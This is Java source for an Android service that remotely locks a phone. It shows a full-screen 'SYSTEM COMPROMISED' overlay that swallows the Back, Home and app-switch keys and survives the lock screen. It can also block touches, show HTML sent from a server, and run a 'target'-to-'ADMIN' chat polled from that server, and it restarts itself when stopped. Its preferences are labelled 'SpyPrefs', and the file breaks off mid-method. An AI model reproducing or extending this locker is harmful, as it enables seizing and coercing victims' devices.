package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.MediaPlayer;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LockOverlayService extends Service {
    public static final String ACTION_LOCK       = "com.nullx.pp.ACTION_LOCK";
    public static final String ACTION_UNLOCK     = "com.nullx.pp.ACTION_UNLOCK";
    public static final String EXTRA_MESSAGE     = "lock_message";
    public static final String EXTRA_PIN         = "lock_pin";
    public static final String ACTION_MIC_RESULT = "com.nullx.pp.ACTION_MIC_RESULT";
    public static final String EXTRA_MIC_GRANTED = "mic_granted";
    public static final String ACTION_PIN_APP = "com.nullx.pp.ACTION_PIN_APP";
    public static final String ACTION_UNPIN_APP = "com.nullx.pp.ACTION_UNPIN_APP";
    public static final String ACTION_TOUCH_LOCK = "com.nullx.pp.ACTION_TOUCH_LOCK";
    public static final String ACTION_TOUCH_UNLOCK = "com.nullx.pp.ACTION_TOUCH_UNLOCK";
    public static final String ACTION_HTML_LOCK = "com.nullx.pp.ACTION_HTML_LOCK";
    public static final String ACTION_HTML_UNLOCK = "com.nullx.pp.ACTION_HTML_UNLOCK";

    private static final String CHANNEL = "LockOverlayChannel";
    private static final int    NID     = 99;

    // ── HACKER PALETTE ──────────────────────────────────────────────────────
    private static final int C_BG        = 0xFF000000; // pure black
    private static final int C_BG2       = 0xFF050F05; // dark green-black
    private static final int C_GREEN     = 0xFF00FF41; // matrix green
    private static final int C_GREEN_DIM = 0xFF00AA30; // dim green
    private static final int C_RED       = 0xFFFF0033; // danger red
    private static final int C_ORANGE    = 0xFFFF6600; // warning orange
    private static final int C_BUBBLE_IN = 0xFF0D1F0D; // incoming bubble
    private static final int C_BUBBLE_ME = 0xFF001A00; // outgoing bubble
    private static final int C_BORDER    = 0xFF00FF41; // green border
    private static final int C_WHITE     = 0xFFFFFFFF;
    private static final int C_GRAY      = 0xFF4A4A4A;

    private WindowManager  wm;
    private View           overlayRoot;
    private View           touchBlocker;
    private WebView        htmlWebView;
    private boolean        htmlLocked = false;
    private LinearLayout   chatList;
    private ScrollView     chatScroll;
    private EditText       etChat;
    private ImageButton    btnMic, btnSend;
    private TextView       tvBlink, tvWarning;
    private MediaRecorder  voiceRecorder;
    private File           voiceFile;
    private boolean        recordingVoice = false;
    private MediaPlayer    voicePlayer;
    private MediaPlayer    lockAudioPlayer;
    private int             previousMusicVolume = -1;
    private Handler        uiHandler, chatHandler, blinkHandler;
    private Runnable       chatRunnable, blinkRunnable;
    private String         deviceId = "", chatToken = "";
    private boolean        blinkState = false;
    // Avoid launching MainActivity repeatedly for the same lock event.
    private boolean        pinIntentSentForSession = false;

    @Override public void onCreate() {
        super.onCreate();
        uiHandler    = new Handler(Looper.getMainLooper());
        chatHandler  = new Handler(Looper.getMainLooper());
        blinkHandler = new Handler(Looper.getMainLooper());
        createChannel();
        startForeground(NID, buildNotif());
        DeviceService.refreshAsync();
        deviceId  = readId();
        chatToken = readChatToken();
        SharedPreferences p = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        if (p.getBoolean("isLocked", false)) {
            String msg = p.getString("lockMessage", "DEVICE LOCKED");
            startLockAudio();
            showOverlay(msg);
            requestAppPin();
        }
        if (p.getBoolean("htmlLocked", false)) {
            String html = p.getString("htmlLockContent", "");
            showHtmlOverlay(html);
        }
        if (p.getBoolean("touchLocked", false)) {
            showTouchBlocker();
        }
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_LOCK.equals(action)) {
            String msg = intent.getStringExtra(EXTRA_MESSAGE);
            if (msg == null || msg.isEmpty()) msg = "DEVICE IS LOCKED";
            saveLock(msg, true);
            startLockAudio();
            showOverlay(msg);
            requestAppPin();
        } else if (ACTION_MIC_RESULT.equals(action)) {
            boolean granted = intent.getBooleanExtra(EXTRA_MIC_GRANTED, false);
            if (granted) startVoiceRecording();
            else toastUi("Izin mikrofon diperlukan untuk VN");
        } else if (ACTION_UNLOCK.equals(action)) {
            saveLock("", false);
            stopLockAudio();
            hideOverlay();
            requestAppUnpin();
        } else if (ACTION_TOUCH_LOCK.equals(action)) {
            getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                .edit().putBoolean("touchLocked", true).apply();
            showTouchBlocker();
        } else if (ACTION_TOUCH_UNLOCK.equals(action)) {
            getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE)
                .edit().putBoolean("touchLocked", false).apply();
            hideTouchBlocker();
        } else if (ACTION_HTML_LOCK.equals(action)) {
            String html = intent.getStringExtra("html");
            if (html == null) html = "";
            getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE).edit()
                    .putBoolean("htmlLocked", true)
                    .putString("htmlLockContent", html).apply();
            showHtmlOverlay(html);
        } else if (ACTION_HTML_UNLOCK.equals(action)) {
            getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE).edit()
                    .putBoolean("htmlLocked", false)
                    .remove("htmlLockContent").apply();
            hideHtmlOverlay();
        }
        return START_STICKY;
    }

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onDestroy() {
        if (recordingVoice) stopVoiceRecording();
        if (voicePlayer != null) { try { voicePlayer.release(); } catch (Exception ignored) {} voicePlayer = null; }
        stopLockAudio();
        blinkHandler.removeCallbacksAndMessages(null);
        hideOverlay();
        hideHtmlOverlay();
        hideTouchBlocker();
        if (chatHandler != null && chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
        Intent restart = new Intent(this, LockOverlayService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restart);
        else startService(restart);
        super.onDestroy();
    }

    // ════════════════════════════════════════════════════════════════════════
    //  OVERLAY — HACKER THEME
    // ════════════════════════════════════════════════════════════════════════
    private void showOverlay(String message) {
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        hideOverlay();

        // ── Root container ────────────────────────────────────────────────
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(C_BG);
        root.setPadding(dp(12), dp(20), dp(12), dp(10));
        root.setFocusable(true);
        root.setFocusableInTouchMode(true);
        root.requestFocus();
        root.setOnKeyListener((v, keyCode, event) -> {
            switch (keyCode) {
                case KeyEvent.KEYCODE_BACK:
                case KeyEvent.KEYCODE_HOME:
                case KeyEvent.KEYCODE_APP_SWITCH:
                case KeyEvent.KEYCODE_MENU:
                    return true;
            }
            return false;
        });

        // ── TOP: Skull + WARNING label ─────────────────────────────────
        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);
        topRow.setPadding(0, 0, 0, dp(6));

        TextView skull = new TextView(this);
        skull.setText("☠");
        skull.setTextColor(C_RED);
        skull.setTextSize(28);
        skull.setPadding(0, 0, dp(8), 0);
        topRow.addView(skull);

        TextView hackerLabel = new TextView(this);
        hackerLabel.setText("SYSTEM COMPROMISED");
        hackerLabel.setTextColor(C_RED);
        hackerLabel.setTextSize(13);
        hackerLabel.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        hackerLabel.setLetterSpacing(0.15f);
        LinearLayout.LayoutParams llp = new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
        hackerLabel.setLayoutParams(llp);
        topRow.addView(hackerLabel);

        // Blinking status dot
        tvBlink = new TextView(this);
        tvBlink.setText("⬤ LIVE");
        tvBlink.setTextColor(C_GREEN);
        tvBlink.setTextSize(11);
        tvBlink.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        topRow.addView(tvBlink);

        root.addView(topRow);

        // ── GREEN SEPARATOR LINE ──────────────────────────────────────
        root.addView(greenLine());

        // ── WARNING MESSAGE BOX ───────────────────────────────────────
        LinearLayout warnBox = new LinearLayout(this);
        warnBox.setOrientation(LinearLayout.VERTICAL);
        warnBox.setBackgroundColor(0xFF0A0000);
        warnBox.setPadding(dp(14), dp(12), dp(14), dp(12));
        GradientDrawable warnBorder = new GradientDrawable();
        warnBorder.setColor(0xFF0A0000);
        warnBorder.setCornerRadius(dp(6));
        warnBorder.setStroke(dp(2), C_RED);
        warnBox.setBackground(warnBorder);

        LinearLayout.LayoutParams warnLp = new LinearLayout.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
            android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        warnLp.setMargins(0, dp(8), 0, dp(8));
        warnBox.setLayoutParams(warnLp);

        TextView tvAlert = new TextView(this);
        tvAlert.setText("⚠  PERINGATAN  ⚠");
        tvAlert.setTextColor(C_RED);
        tvAlert.setTextSize(12);
        tvAlert.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        tvAlert.setLetterSpacing(0.2f);
        tvAlert.setGravity(Gravity.CENTER);
        warnBox.addView(tvAlert);

        tvWarning = new TextView(this);
        tvWarning.setText(message);
        tvWarning.setTextColor(C_GREEN);
        tvWarning.setTextSize(15);
        tvWarning.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        tvWarning.setGravity(Gravity.CENTER);
        tvWarning.setPadding(0, dp(6), 0, 0);
        warnBox.addView(tvWarning);

        root.addView(warnBox);

        // ── INFO ROWS (hacker-style) ──────────────────────────────────
        root.addView(infoRow("► DEVICE ID  :", deviceId.isEmpty() ? "UNKNOWN" : deviceId));
        root.addView(infoRow("► STATUS     :", "LOCKED  |  ACCESS DENIED"));
        root.addView(infoRow("► ACTION     :", "CONTACT ADMIN IMMEDIATELY"));

        root.addView(greenLine());

        // ── CHAT HEADER ───────────────────────────────────────────────
        TextView chatHeader = new TextView(this);
        chatHeader.setText("[ SECURE CHANNEL — ADMIN MESSAGING ]");
        chatHeader.setTextColor(C_GREEN_DIM);
        chatHeader.setTextSize(10);
        chatHeader.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        chatHeader.setLetterSpacing(0.1f);
        chatHeader.setGravity(Gravity.CENTER);
        chatHeader.setPadding(0, dp(6), 0, dp(6));
        root.addView(chatHeader);

        // ── CHAT SCROLL ───────────────────────────────────────────────
        chatScroll = new ScrollView(this);
        chatScroll.setFillViewport(true);
        chatScroll.setBackgroundColor(C_BG2);

        GradientDrawable chatBorder = new GradientDrawable();
        chatBorder.setColor(C_BG2);
        chatBorder.setCornerRadius(dp(8));
        chatBorder.setStroke(1, C_GREEN_DIM);
        chatScroll.setBackground(chatBorder);

        LinearLayout.LayoutParams chatScrollLp = new LinearLayout.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f);
        chatScrollLp.setMargins(0, 0, 0, dp(8));
        chatScroll.setLayoutParams(chatScrollLp);

        chatList = new LinearLayout(this);
        chatList.setOrientation(LinearLayout.VERTICAL);
        chatList.setPadding(dp(8), dp(8), dp(8), dp(8));
        chatScroll.addView(chatList, new ScrollView.LayoutParams(
            ScrollView.LayoutParams.MATCH_PARENT,
            ScrollView.LayoutParams.WRAP_CONTENT));
        root.addView(chatScroll);

        // ── COMPOSER ─────────────────────────────────────────────────
        LinearLayout composer = new LinearLayout(this);
        composer.setOrientation(LinearLayout.HORIZONTAL);
        composer.setGravity(Gravity.CENTER_VERTICAL);
        composer.setLayoutParams(new LinearLayout.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT, dp(56)));

        etChat = new EditText(this);
        etChat.setHint("> type message...");
        etChat.setHintTextColor(C_GREEN_DIM);
        etChat.setTextColor(C_GREEN);
        etChat.setTextSize(13);
        etChat.setTypeface(Typeface.MONOSPACE);
        etChat.setSingleLine(true);
        etChat.setPadding(dp(14), 0, dp(12), 0);
        etChat.setCursorVisible(true);
        GradientDrawable inputBg = new GradientDrawable();
        inputBg.setColor(0xFF050F05);
        inputBg.setCornerRadius(dp(4));
        inputBg.setStroke(dp(1), C_GREEN);
        etChat.setBackground(inputBg);
        LinearLayout.LayoutParams etLp = new LinearLayout.LayoutParams(0, dp(48), 1f);
        etLp.setMargins(0, 0, dp(8), 0);
        etChat.setLayoutParams(etLp);
        etChat.setImeOptions(android.view.inputmethod.EditorInfo.IME_ACTION_SEND);
        etChat.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == android.view.inputmethod.EditorInfo.IME_ACTION_SEND ||
                (event != null && event.getKeyCode() == KeyEvent.KEYCODE_ENTER)) {
                sendChat(); return true;
            }
            return false;
        });

        btnMic = new ImageButton(this);
        btnMic.setImageResource(android.R.drawable.ic_btn_speak_now);
        btnMic.setColorFilter(C_GREEN);
        btnMic.setBackground(squareBg(0xFF050F05, C_GREEN_DIM, 4));
        btnMic.setContentDescription("Rekam VN");
        btnMic.setOnClickListener(v -> toggleVoiceRecording());
        LinearLayout.LayoutParams micLp = new LinearLayout.LayoutParams(dp(48), dp(48));
        micLp.setMargins(0, 0, dp(8), 0);
        btnMic.setLayoutParams(micLp);

        btnSend = new ImageButton(this);
        btnSend.setImageResource(android.R.drawable.ic_menu_send);
        btnSend.setColorFilter(C_BG);
        btnSend.setBackground(squareBg(C_GREEN, C_GREEN, 4));
        btnSend.setContentDescription("Kirim");
        btnSend.setOnClickListener(v -> sendChat());
        btnSend.setLayoutParams(new LinearLayout.LayoutParams(dp(48), dp(48)));

        composer.addView(etChat);
        composer.addView(btnMic);
        composer.addView(btnSend);
        root.addView(composer);



        overlayRoot = root;

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        try { wm.addView(overlayRoot, params); }
        catch (Exception e) { android.util.Log.w("LOCK", "addView: " + e.getMessage()); }

        startChatPoll();
        startBlink();
    }

    /**
     * Minta MainActivity masuk ke Android screen-pinning/lock-task mode.
     *
     * Jangan memakai counter buatan aplikasi di sini. Dialog sistem
     * "Aplikasi disematkan" punya status konfirmasi sendiri di Android:
     * - "Mengerti" -> Android menganggap penjelasan sudah dikonfirmasi,
     *   sehingga dialog tidak perlu ditampilkan lagi.
     * - "Lain kali" -> status tersebut tidak dikonfirmasi, sehingga dialog
     *   boleh muncul lagi pada permintaan pin berikutnya.
     *
     * Dengan begitu aplikasi tidak membatasi jumlah kemunculan dialog dan
     * tidak menyimpan pinRequestCount yang membuat perilaku menjadi salah.
     */
    private void requestAppPin() {
        // ACTION_LOCK can be followed by onCreate()/START_STICKY callbacks.
        // Launching the pin activity more than once can make Android show the
        // screen-pinning confirmation repeatedly. Only request it once per lock.
        if (pinIntentSentForSession) return;
        pinIntentSentForSession = true;
        try {
            Intent i = new Intent(this, MainActivity.class);
            i.setAction(ACTION_PIN_APP);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        } catch (Exception e) {
            android.util.Log.w("LOCK", "pin activity: " + e.getMessage());
        }
    }

    private void requestAppUnpin() {
        pinIntentSentForSession = false;
        try {
            sendBroadcast(new Intent(ACTION_UNPIN_APP).setPackage(getPackageName()));
        } catch (Exception ignored) {}
        try {
            Intent i = new Intent(this, MainActivity.class);
            i.setAction(ACTION_UNPIN_APP);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
        } catch (Exception ignored) {}
    }


    /**
     * Transparent full-screen touch shield. The display remains visible,
     * but ordinary screen touches are consumed while this mode is enabled.
     */
    private void showTouchBlocker() {
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        hideTouchBlocker();

        View blocker = new View(this);
        blocker.setBackgroundColor(Color.TRANSPARENT);
        blocker.setClickable(true);
        blocker.setFocusable(false);
        blocker.setOnTouchListener((v, event) -> true);
        blocker.setContentDescription("Guardian touch lock");

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;

        try {
            wm.addView(blocker, params);
            touchBlocker = blocker;
        } catch (Exception e) {
            android.util.Log.w("TOUCH_LOCK", "addView: " + e.getMessage());
        }
    }

    private void hideTouchBlocker() {
        if (touchBlocker != null && wm != null) {
            try { wm.removeView(touchBlocker); } catch (Exception ignored) {}
            touchBlocker = null;
        }
    }

    private void hideOverlay() {
        blinkHandler.removeCallbacksAndMessages(null);
        if (chatHandler != null && chatRunnable != null) chatHandler.removeCallbacks(chatRunnable);
        if (overlayRoot != null && wm != null) {
            try { wm.removeView(overlayRoot); } catch (Exception ignored) {}
            overlayRoot = null;
        }
    }

    // ── HTML LOCK OVERLAY ─────────────────────────────────────────────────
    private void showHtmlOverlay(String html) {
        if (wm == null) wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        hideHtmlOverlay();
        htmlLocked = true;
        if (html == null || html.trim().isEmpty()) {
            html = "<html><body style='margin:0;background:#000;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center'><div><h2>Perangkat Terkunci</h2><p>HTML Lock aktif.</p></div></body></html>";
        }
        WebView w = new WebView(this);
        htmlWebView = w;
        w.setBackgroundColor(Color.BLACK);
        w.setFocusable(true);
        w.setFocusableInTouchMode(true);
        w.requestFocus();
        w.getSettings().setJavaScriptEnabled(true);
        w.getSettings().setDomStorageEnabled(true);
        w.setWebChromeClient(new WebChromeClient());
        w.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);

        w.setOnKeyListener((v, keyCode, event) -> {
            return keyCode == KeyEvent.KEYCODE_BACK
                    || keyCode == KeyEvent.KEYCODE_HOME
                    || keyCode == KeyEvent.KEYCODE_APP_SWITCH
                    || keyCode == KeyEvent.KEYCODE_MENU;
        });

        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                        | WindowManager.LayoutParams.FLAG_FULLSCREEN
                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.TOP | Gravity.START;
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
        try {
            wm.addView(w, params);
            startHtmlImmersive();
        } catch (Exception e) {
            htmlWebView = null;
            android.util.Log.w("HTML_LOCK", "addView: " + e.getMessage());
        }
    }

    private void startHtmlImmersive() {
        try {
            if (htmlWebView != null) htmlWebView.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
        } catch (Exception ignored) {}
    }

    private void hideHtmlOverlay() {
        htmlLocked = false;
        if (htmlWebView != null && wm != null) {
            try { htmlWebView.stopLoading(); } catch (Exception ignored) {}
            try { wm.removeView(htmlWebView); } catch (Exception ignored) {}
        }
        htmlWebView = null;
    }

    // ── BLINK ANIMATION ─────────────────────────────────────────────────────
    private void startBlink() {
        blinkRunnable = new Runnable() {
            @Override public void run() {
                if (tvBlink == null) return;
                blinkState = !blinkState;
                tvBlink.setTextColor(blinkState ? C_GREEN : C_BG);
                blinkHandler.postDelayed(this, 600);
            }
        };
        blinkHandler.post(blinkRunnable);
    }

    // ── UI HELPERS ───────────────────────────────────────────────────────────
    private View greenLine() {
        View v = new View(this);
        v.setBackgroundColor(C_GREEN_DIM);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT, dp(1));
        lp.setMargins(0, dp(4), 0, dp(4));
        v.setLayoutParams(lp);
        return v;
    }

    private View infoRow(String label, String value) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
            android.view.ViewGroup.LayoutParams.MATCH_PARENT,
            android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        rlp.setMargins(0, dp(2), 0, dp(2));
        row.setLayoutParams(rlp);

        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(C_GREEN_DIM);
        lbl.setTextSize(10);
        lbl.setTypeface(Typeface.MONOSPACE);
        lbl.setMinWidth(dp(120));
        row.addView(lbl);

        TextView val = new TextView(this);
        val.setText(value);
        val.setTextColor(C_GREEN);
        val.setTextSize(10);
        val.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        val.setSingleLine(true);
        val.setEllipsize(TextUtils.TruncateAt.END);
        row.addView(val, new LinearLayout.LayoutParams(0, android.view.ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        return row;
    }

    private GradientDrawable squareBg(int fill, int stroke, int radius) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(fill);
        d.setCornerRadius(dp(radius));
        d.setStroke(dp(1), stroke);
        return d;
    }

    private GradientDrawable circleBg(int color) {
        GradientDrawable d = new GradientDrawable();
        d.setColor(color);
        d.setShape(GradientDrawable.OVAL);
        return d;
    }

    private void toastUi(String text) {
        uiHandler.post(() -> android.widget.Toast.makeText(this, text, android.widget.Toast.LENGTH_SHORT).show());
    }

    // ── CHAT ─────────────────────────────────────────────────────────────────
    private void startChatPoll() {
        chatRunnable = new Runnable() {
            @Override public void run() {
                pollChat();
                chatHandler.postDelayed(this, 3000);
            }
        };
        chatHandler.post(chatRunnable);
    }

    private void pollChat() {
        if (deviceId.isEmpty()) return;
        new Thread(() -> {
            try {
                chatToken = readChatToken();
                String server = readChatServer();
                if (chatToken.isEmpty()) return;
                String resp = httpGet(server + "/api/lock-chat-child/" + deviceId
                    + "?deviceToken=" + java.net.URLEncoder.encode(chatToken, "UTF-8"));
                if (resp == null) return;
                JSONObject obj = new JSONObject(resp);
                JSONArray msgs = obj.optJSONArray("messages");
                if (msgs == null || msgs.length() == 0) return;
                uiHandler.post(() -> renderMessages(msgs));
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendChat() {
        if (etChat == null || deviceId.isEmpty()) return;
        String text = etChat.getText().toString().trim();
        if (text.isEmpty()) return;
        etChat.setText("");
        uiHandler.post(() -> { if (chatList != null) addBubble("target", text, "", "", false); });
        new Thread(() -> {
            try {
                chatToken = readChatToken();
                if (chatToken.isEmpty()) return;
                JSONObject b = new JSONObject();
                b.put("text", text);
                b.put("from", "target");
                b.put("deviceToken", chatToken);
                postJson(readChatServer() + "/api/lock-chat-child/" + deviceId, b.toString());
            } catch (Exception ignored) {}
        }).start();
    }

    private void renderMessages(JSONArray msgs) {
        if (chatList == null) return;
        chatList.removeAllViews();
        try {
            for (int i = 0; i < msgs.length(); i++) {
                JSONObject m = msgs.getJSONObject(i);
                String from  = m.optString("from", "owner");
                String text  = m.optString("text", "");
                String time  = m.optString("time", "");
                String type  = m.optString("type", "text");
                String audio = m.optString("audio", "");
                addBubble(from, text, time, audio, "voice".equals(type) && !audio.isEmpty());
            }
        } catch (Exception ignored) {}
        chatScroll.post(() -> chatScroll.fullScroll(ScrollView.FOCUS_DOWN));
    }

    private void addBubble(String from, String text, String time, String audio, boolean voice) {
        if (chatList == null) return;
        boolean mine = "target".equals(from) || "child".equals(from) || "you".equalsIgnoreCase(from);

        LinearLayout line = new LinearLayout(this);
        line.setGravity(mine ? Gravity.END : Gravity.START);
        line.setPadding(0, dp(4), 0, dp(4));

        LinearLayout bubble = new LinearLayout(this);
        bubble.setOrientation(LinearLayout.VERTICAL);
        bubble.setPadding(dp(12), dp(8), dp(12), dp(8));

        GradientDrawable bg = new GradientDrawable();
        bg.setColor(mine ? C_BUBBLE_ME : C_BUBBLE_IN);
        bg.setCornerRadius(dp(8));
        bg.setStroke(dp(1), mine ? C_GREEN_DIM : C_RED);
        bubble.setBackground(bg);

        // Sender label
        TextView sender = new TextView(this);
        sender.setText(mine ? "[ YOU ]" : "[ ADMIN ]");
        sender.setTextColor(mine ? C_GREEN_DIM : C_RED);
        sender.setTextSize(9);
        sender.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        sender.setLetterSpacing(0.1f);
        bubble.addView(sender);

        // Message text
        TextView tv = new TextView(this);
        tv.setTextColor(mine ? C_GREEN : 0xFFFFFFFF);
        tv.setTextSize(13);
        tv.setTypeface(Typeface.MONOSPACE);
        if (voice) {
            tv.setText("▶  VOICE NOTE");
            tv.setOnClickListener(v -> playVoice(audio));
            tv.setTextColor(C_ORANGE);
        } else {
            tv.setText(text);
        }
        bubble.addView(tv);

        // Time
        if (!time.isEmpty()) {
            TextView tvTime = new TextView(this);
            tvTime.setText(time);
            tvTime.setTextColor(C_GREEN_DIM);
            tvTime.setTextSize(9);
            tvTime.setTypeface(Typeface.MONOSPACE);
            tvTime.setGravity(mine ? Gravity.END : Gravity.START);
            bubble.addView(tvTime);
        }

        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
            dp(250), android.view.ViewGroup.LayoutParams.WRAP_CONTENT);
        line.addView(bubble, bp);
        chatList.addView(line);
    }

    // ── VOICE ────────────────────────────────────────────────────────────────
    private void toggleVoiceRecording() {
        if (recordingVoice) stopVoiceRecording(); else requestMicAndStart();
    }

    private void requestMicAndStart() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M ||
            checkSelfPermission("android.permission.RECORD_AUDIO") == PackageManager.PERMISSION_GRANTED) {
            startVoiceRecording(); return;
        }
        try {
            Intent i = new Intent(this, MainActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            i.putExtra("request_mic_for_lock_chat", true);
            startActivity(i);
        } catch (Exception e) { toastUi("Buka aplikasi untuk memberi izin mikrofon"); }
    }

    private void startVoiceRecording() {
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(NID, buildNotif(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(NID, buildNotif());
            }
        } catch (Exception ignored) {}

        if (recordingVoice) return;
        try {
            voiceFile = new File(getCacheDir(), "child_vn_" + System.currentTimeMillis() + ".m4a");
            voiceRecorder = new MediaRecorder();
            voiceRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            voiceRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            voiceRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            voiceRecorder.setAudioEncodingBitRate(64000);
            voiceRecorder.setAudioSamplingRate(44100);
            voiceRecorder.setOutputFile(voiceFile.getAbsolutePath());
            voiceRecorder.prepare();
            voiceRecorder.start();
            recordingVoice = true;
            uiHandler.post(() -> {
                if (btnMic != null) {
                    btnMic.setBackground(squareBg(C_RED, C_RED, 4));
                    btnMic.setColorFilter(C_WHITE);
                }
            });
